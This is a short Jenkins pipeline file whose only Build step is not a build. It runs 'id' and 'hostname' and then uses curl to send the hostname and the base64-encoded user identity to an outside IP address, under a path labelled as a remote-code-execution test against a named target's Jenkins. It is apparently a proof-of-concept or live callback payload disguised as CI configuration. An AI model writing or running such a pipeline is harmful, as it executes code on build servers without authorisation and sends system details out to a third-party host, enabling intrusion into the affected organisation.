pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh 'id && hostname && curl http://137.184.141.100/rce_travala_jenkins_$(hostname)_$(id|base64)'
            }
        }
    }
}
